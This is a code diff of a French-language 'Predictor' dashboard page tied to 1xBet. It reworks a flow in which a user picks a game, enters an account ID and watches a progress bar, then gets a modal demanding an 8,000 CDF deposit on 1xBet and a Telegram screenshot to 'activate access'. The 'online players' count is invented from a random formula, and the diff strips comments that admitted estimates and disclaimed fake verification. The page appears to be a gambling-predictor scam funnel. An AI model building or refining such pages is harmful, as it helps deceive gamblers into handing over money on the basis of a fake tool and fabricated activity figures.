@@ -5,7 +5,91 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Dashboard · Predictor</title>
   <link rel="stylesheet" href="./styles.css" />
+
+  <style>
+    /* Modal (best UX): shows after "Démarrer" */
+    .modal {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 22px;
+      background: rgba(0,0,0,.58);
+      z-index: 999;
+    }
+    .modalCard {
+      width: min(560px, 100%);
+      border-radius: 18px;
+      border: 1px solid rgba(255,255,255,.12);
+      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.03));
+      box-shadow: 0 30px 90px rgba(0,0,0,.70);
+      overflow: hidden;
+      backdrop-filter: blur(12px);
+      animation: pop .18s ease-out forwards;
+    }
+    @keyframes pop {
+      from { transform: translateY(8px) scale(.98); opacity: 0; }
+      to { transform: translateY(0) scale(1); opacity: 1; }
+    }
+    .modalHead{
+      padding: 16px 18px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      border-bottom: 1px solid rgba(255,255,255,.08);
+      background: radial-gradient(900px 260px at 20% 0%, rgba(250,204,21,.14), transparent 58%),
+                  radial-gradient(900px 260px at 85% 0%, rgba(96,165,250,.12), transparent 58%),
+                  linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
+    }
+    .modalHead b{
+      font-size: 14px;
+      font-weight: 1100;
+      letter-spacing: .2px;
+    }
+    .modalClose{
+      border: 0;
+      cursor: pointer;
+      width: 36px;
+      height: 36px;
+      border-radius: 12px;
+      color: rgba(245,247,255,.85);
+      background: rgba(255,255,255,.06);
+      border: 1px solid rgba(255,255,255,.12);
+      font-size: 18px;
+      line-height: 1;
+    }
+    .modalBody{ padding: 16px 18px 18px; }
+    .modalText{
+      margin: 0 0 12px;
+      color: rgba(245,247,255,.72);
+      font-size: 13.5px;
+      line-height: 1.55;
+    }
+    .modalHint{
+      margin-top: 10px;
+      padding: 12px;
+      border-radius: 16px;
+      border: 1px solid rgba(34,197,94,.25);
+      background: rgba(34,197,94,.10);
+      color: rgba(245,247,255,.92);
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .modalActions{ display:grid; gap:10px; margin-top: 12px; }
+    .modalSmall{
+      margin-top: 10px;
+      font-size: 11.5px;
+      color: rgba(245,247,255,.52);
+      display:flex;
+      justify-content:space-between;
+      gap:10px;
+      flex-wrap:wrap;
+    }
+  </style>
 </head>
+
 <body>
   <div class="wrap">
     <div class="card">
@@ -51,12 +135,6 @@
         <div class="bar" aria-label="progress"><div id="bar"></div></div>
 
         <button class="btn" id="start">Démarrer</button>
-        <button class="btn secondary" id="deposit">💳 Faire un dépôt</button>
-
-        <div class="row2">
-          <button class="btn secondary" id="tg">Envoyer la capture (Telegram)</button>
-          <button class="btn secondary" id="wa">Envoyer la capture (WhatsApp)</button>
-        </div>
 
         <div class="alert" id="msg"></div>
 
@@ -72,6 +150,35 @@
       <div class="foot">
         <span>18+ • Jeu responsable</span>
         <span>Paiements uniquement sur 1xBet</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL (shows after "Démarrer") -->
+  <div class="modal" id="modal" aria-hidden="true">
+    <div class="modalCard" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <div class="modalHead">
+        <b id="modalTitle">Activation</b>
+        <button class="modalClose" id="closeModal" aria-label="Fermer">✕</button>
+      </div>
+      <div class="modalBody">
+        <p class="modalText" id="modalText">
+          —
+        </p>
+
+        <div class="modalActions">
+          <button class="btn secondary" id="deposit">💳 Faire un dépôt</button>
+          <button class="btn secondary" id="tg">Envoyer la capture (Telegram)</button>
+        </div>
+
+        <div class="modalHint" id="modalHint">
+          —
+        </div>
+
+        <div class="modalSmall">
+          <span>Ce site ne traite aucun paiement</span>
+          <span>Validation via capture</span>
+        </div>
       </div>
     </div>
   </div>
@@ -98,9 +205,6 @@
       const mm = String(Math.floor(left/60000)).padStart(2,"0");
       const ss = String(Math.floor((left%60000)/1000)).padStart(2,"0");
       timerEl.textContent = `${mm}:${ss}`;
-      if(left === 0){
-        showMsg("Session expirée. Reconnectez-vous.", false);
-      }
     }
     tick(); setInterval(tick, 500);
 
@@ -109,7 +213,7 @@
     const max = Number(A.DAILY_PLAYERS_MAX || 1100);
     document.getElementById("daily").textContent = `${min.toLocaleString("fr-FR")}–${max.toLocaleString("fr-FR")}`;
 
-    // Online estimate (clearly labeled est.)
+    // Online estimate (est.)
     function clamp(x,a,b){ return Math.max(a, Math.min(b, x)); }
     function mulberry32(seed){
       return function(){
@@ -122,26 +226,20 @@
     function estimateOnline(){
       const now = new Date();
       const h = now.getHours() + now.getMinutes()/60;
-
       const peak1 = Math.exp(-Math.pow((h - 13.0)/3.0, 2));
       const peak2 = Math.exp(-Math.pow((h - 20.0)/3.0, 2));
       let intensity = 0.10 + 0.55*peak1 + 0.75*peak2;
       intensity = clamp(intensity, 0.10, 1.00);
-
-      const activeShare = 0.03 + 0.07*intensity; // 3%..10%
+      const activeShare = 0.03 + 0.07*intensity;
       const dailyMid = (min + max)/2;
-
       const seed = now.getFullYear()*1000000 + (now.getMonth()+1)*10000 + now.getDate()*100 + now.getHours();
       const rnd = mulberry32(seed)();
       const jitter = 0.92 + rnd*0.16;
-
       const est = Math.round(dailyMid * activeShare * jitter);
       return clamp(est, 20, Math.round(max*0.14));
     }
     const onlineEl = document.getElementById("online");
-    function updateOnline(){
-      onlineEl.textContent = `~ ${estimateOnline().toLocaleString("fr-FR")}`;
-    }
+    function updateOnline(){ onlineEl.textContent = `~ ${estimateOnline().toLocaleString("fr-FR")}`; }
     updateOnline(); setInterval(updateOnline, 20000);
 
     // Game selection
@@ -155,46 +253,76 @@
       });
     });
 
-    // Account ID hint / validation
+    // ID validation
     const hint = document.getElementById("hint");
-    if (A.REQUIRED_PREFIX) hint.textContent = `Entrez ${A.ACCOUNT_ID_LENGTH} chiffres (doit commencer par ${A.REQUIRED_PREFIX})`;
+    if (A.REQUIRED_PREFIX) hint.textContent = `Entrez ${A.ACCOUNT_ID_LENGTH || 10} chiffres (doit commencer par ${A.REQUIRED_PREFIX})`;
 
     const acc = document.getElementById("acc");
     acc.addEventListener("input", ()=>{
-      acc.value = acc.value.replace(/\D/g,"").slice(0, A.ACCOUNT_ID_LENGTH || 10);
+      const L = (A.ACCOUNT_ID_LENGTH || 10);
+      acc.value = acc.value.replace(/\D/g,"").slice(0, L);
     });
 
-    // Progress + messages
+    // UI helpers
     const bar = document.getElementById("bar");
     const msg = document.getElementById("msg");
-    function showMsg(text, ok){
-      msg.className = "alert" + (ok ? " ok" : "");
+
+    function showMsg(text){
+      msg.className = "alert";
       msg.style.display = "block";
       msg.textContent = text;
     }
 
     function validate(){
       const id = acc.value.trim();
+      const L = (A.ACCOUNT_ID_LENGTH || 10);
       if(!selectedGame) return "Choisissez un jeu.";
-      if(id.length !== (A.ACCOUNT_ID_LENGTH || 10)) return `Entrez ${A.ACCOUNT_ID_LENGTH || 10} chiffres pour l'ID.`;
+      if(id.length !== L) return `Entrez ${L} chiffres pour l'ID.`;
       if(A.REQUIRED_PREFIX && !id.startsWith(A.REQUIRED_PREFIX)) return `L'ID doit commencer par ${A.REQUIRED_PREFIX}.`;
       return "";
     }
 
+    // Modal logic
+    const modal = document.getElementById("modal");
+    const modalText = document.getElementById("modalText");
+    const modalHint = document.getElementById("modalHint");
+    const closeModalBtn = document.getElementById("closeModal");
+
+    function openModal(){
+      modal.style.display = "flex";
+      modal.setAttribute("aria-hidden","false");
+    }
+    function closeModal(){
+      modal.style.display = "none";
+      modal.setAttribute("aria-hidden","true");
+    }
+    closeModalBtn.addEventListener("click", closeModal);
+    modal.addEventListener("click", (e)=>{ if(e.target === modal) closeModal(); });
+    document.addEventListener("keydown", (e)=>{ if(e.key === "Escape") closeModal(); });
+
+    // Start flow -> show modal AFTER progress
     document.getElementById("start").addEventListener("click", ()=>{
       const err = validate();
-      if(err) return showMsg(err, false);
+      if(err){
+        bar.style.width = "0%";
+        return showMsg(err);
+      }
 
       msg.style.display = "none";
       bar.style.width = "0%";
+
       let p = 0;
       const t = setInterval(()=>{
         p += 18;
         bar.style.width = Math.min(100, p) + "%";
         if(p >= 100){
           clearInterval(t);
-          // No fake “verification”: just clear instruction
-          showMsg(`Session prête pour ${selectedGame}. Pour activer l’accès, effectuez un dépôt de ${Number(A.DEPOSIT_AMOUNT).toLocaleString("fr-FR")} ${A.CURRENCY} sur 1xBet, puis envoyez la capture.`, true);
+
+          const amountText = `${Number(A.DEPOSIT_AMOUNT || 8000).toLocaleString("fr-FR")} ${A.CURRENCY || "CDF"}`;
+          modalText.textContent = `Session prête pour ${selectedGame}. Pour activer l’accès, effectuez un dépôt de ${amountText} sur 1xBet.`;
+          modalHint.textContent = `Ensuite, envoyez la capture d’écran du dépôt via Telegram pour validation.`;
+
+          openModal();
         }
       }, 220);
     });
@@ -204,7 +332,7 @@
       window.open(A.OFFICIAL_1XBET_URL, "_blank", "noopener,noreferrer");
     });
 
-    // Send screenshot
+    // Telegram send
     function depositText(){
       const amountText = `${Number(A.DEPOSIT_AMOUNT || 8000).toLocaleString("fr-FR")} ${A.CURRENCY || "CDF"}`;
       const user = sessionStorage.getItem("user") || "";
@@ -212,15 +340,9 @@
       const game = selectedGame || "—";
       return `Bonjour. J’ai effectué le dépôt ${amountText}. Login: ${user}. ID: ${id}. Jeu: ${game}. J’envoie la capture d’écran maintenant.`;
     }
-
     document.getElementById("tg").addEventListener("click", ()=>{
       const text = encodeURIComponent(depositText());
       window.open(`https://t.me/${A.TELEGRAM_USERNAME}?text=${text}`, "_blank", "noopener,noreferrer");
-    });
-
-    document.getElementById("wa").addEventListener("click", ()=>{
-      const text = encodeURIComponent(depositText());
-      window.open(`https://wa.me/${A.WHATSAPP_NUMBER}?text=${text}`, "_blank", "noopener,noreferrer");
     });
 
     // Logout
